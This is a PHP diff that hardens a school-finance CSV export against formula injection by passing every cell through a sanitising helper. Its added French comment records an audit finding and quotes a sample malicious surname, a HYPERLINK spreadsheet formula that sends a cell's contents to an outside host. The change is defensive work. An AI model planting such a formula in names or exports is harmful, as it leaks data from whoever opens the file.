@@ -591,8 +591,16 @@ function finance_build_outstanding_csv(array $rows): string
         'Devise', 'Dû', 'Encaissé', 'Reste', 'En retard', 'Avance', 'Échéance la plus ancienne',
     ], ';', '"', '');
 
+    // CHAQUE CELLULE EST DÉSARMÉE — audit de la phase 9C.
+    //
+    // Cet export, livré en phase 5, écrivait des noms d'élèves et de
+    // classes saisis par l'école directement dans un fichier qu'Excel
+    // ouvre en évaluant les formules. Le nom de famille
+    // `=HYPERLINK("http://ailleurs.cd?d="&A1;"Cliquez")` suffisait.
+    // Voir `csv_safe_cell()` dans le noyau : une seule règle pour tous
+    // les exports du produit.
     foreach ($rows as $row) {
-        fputcsv($handle, [
+        fputcsv($handle, array_map('csv_safe_cell', [
             $row['matricule'],
             $row['last_name'],
             $row['post_name'] ?? '',
@@ -606,7 +614,7 @@ function finance_build_outstanding_csv(array $rows): string
             number_format((float) $row['overdue'], 2, ',', ''),
             number_format((float) ($row['advance'] ?? 0), 2, ',', ''),
             $row['oldest_due'] ?? '',
-        ], ';', '"', '');
+        ]), ';', '"', '');
     }
 
     rewind($handle);
